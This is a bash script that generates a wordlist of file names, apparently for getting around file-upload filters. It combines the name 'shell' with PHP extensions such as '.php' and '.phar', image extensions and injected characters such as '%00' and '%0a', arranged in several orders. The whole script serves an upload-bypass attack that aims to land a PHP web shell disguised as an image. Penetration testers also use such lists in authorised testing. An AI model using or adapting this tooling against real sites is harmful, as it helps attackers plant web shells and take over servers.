#!/bin/bash

# Assign shell name to a variable
shell_name="shell"

# Define arrays for special characters, file extensions, and valid extensions
special_chars=('%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':')
# This can be modified to contain different extensions.
extensions=('.php' '.phps' '.phptml' '.phar' '.php.inc' '.php-dis')
# This can be dropped to single entries if we know valid extension type.
valid_extensions=('jpg' 'png' 'gif' 'bmp' 'svg')

# Loop over each special character
for char in "${special_chars[@]}"; do
    # Loop over each file extension
    for ext in "${extensions[@]}"; do
        # Loop over each valid extension
        for valid_ext in "${valid_extensions[@]}"; do
            # Generate permutations and append to wordlist.txt
            echo "${shell_name}${char}${ext}.${valid_ext}" >> wordlist.txt
            echo "${shell_name}${ext}${char}.${valid_ext}" >> wordlist.txt
            echo "${shell_name}.${valid_ext}${char}${ext}" >> wordlist.txt
            echo "${shell_name}.${valid_ext}${ext}${char}" >> wordlist.txt
            echo "${shell_name}.${valid_ext}.${ext}" >> wordlist.txt
            echo "${shell_name}${ext}.${valid_ext}" >> wordlist.txt
        done
    done
done
